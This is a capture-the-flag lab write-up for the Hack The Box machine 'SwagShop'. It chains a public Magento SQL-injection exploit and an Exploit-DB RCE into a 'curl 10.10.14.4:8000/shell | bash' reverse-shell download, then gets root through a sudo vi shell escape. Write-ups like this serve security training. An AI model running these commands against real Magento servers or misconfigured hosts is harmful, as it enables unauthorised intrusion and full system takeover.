## SwagShop

Difficulty: Easy

### User Flag

```
rustscan -a swagshop.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/222139443-28f9d160-3bcc-4a92-a340-4708e2d84107.png)

<br>

Accessing the website, Magento is being used.

![websiteMagento](https://user-images.githubusercontent.com/58514930/222139663-0eeebe6c-6567-4284-ae7c-08ade491b1c6.png)

<br>

Searching for Magento exploits, [this one works](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py) and create a user that give us access to the admin panel.  

```
python2 poc.py http://swagshop.htb"
```

![initialExploit](https://user-images.githubusercontent.com/58514930/222140829-445ac0e5-475b-44bf-ac6d-c3b7cf78d344.png)

![adminLogin](https://user-images.githubusercontent.com/58514930/222140850-602af55b-cdf2-45ed-b240-bd9ed1b7b64c.png)

<br>

In the admin panel, we find the magento version.

![magentoVersion](https://user-images.githubusercontent.com/58514930/222141639-1862f39e-dade-4ef5-bb60-557ebf16b5da.png)

<br>

Searching for Magento 1.9.0.0 version, we find a [RCE Exploit](https://www.exploit-db.com/exploits/37811).  

First we need to fill in these informations.

![exploitConfigDB](https://user-images.githubusercontent.com/58514930/222142019-c6349eab-4950-41f2-8be9-19730f273e08.png)

<br>

The install date is find in /app/etc/local.xml.

![gettingConfig](https://user-images.githubusercontent.com/58514930/222142257-03ada822-64ce-45e8-afc7-14d70fa0d1d7.png)

![exploitModified](https://user-images.githubusercontent.com/58514930/222143664-a311e243-dffd-497e-abb7-66be79a829ca.png)

<br>

Testing RCE.

![RCEworking](https://user-images.githubusercontent.com/58514930/222143759-f843b136-8cc2-47a9-81b8-6e88c11b2000.png)

<br>

Create a "shell" file with a reverse shell and curl it to get it.

```
python2 37811 "http://10.10.10.140/index.php/admin/" "curl 10.10.14.4:8000/shell | bash"
```

![gettingReverseShell](https://user-images.githubusercontent.com/58514930/222143893-4d478100-a317-4a97-8ec9-e41f0ac1205b.png)

### Root Flag

Enumerating with sudo -l, we see that we have permission to execute vim on any /var/www/html/* file.

![sudo -l](https://user-images.githubusercontent.com/58514930/222143955-e9ed4211-4d88-49d9-931b-294f476ac4cd.png)

<br>

```
sudo /usr/bin/vi /var/www/html/test.php
!:sh
```

![rootAccess](https://user-images.githubusercontent.com/58514930/222144136-244cc3e8-df5f-4f65-bc70-16ee741693c9.png)
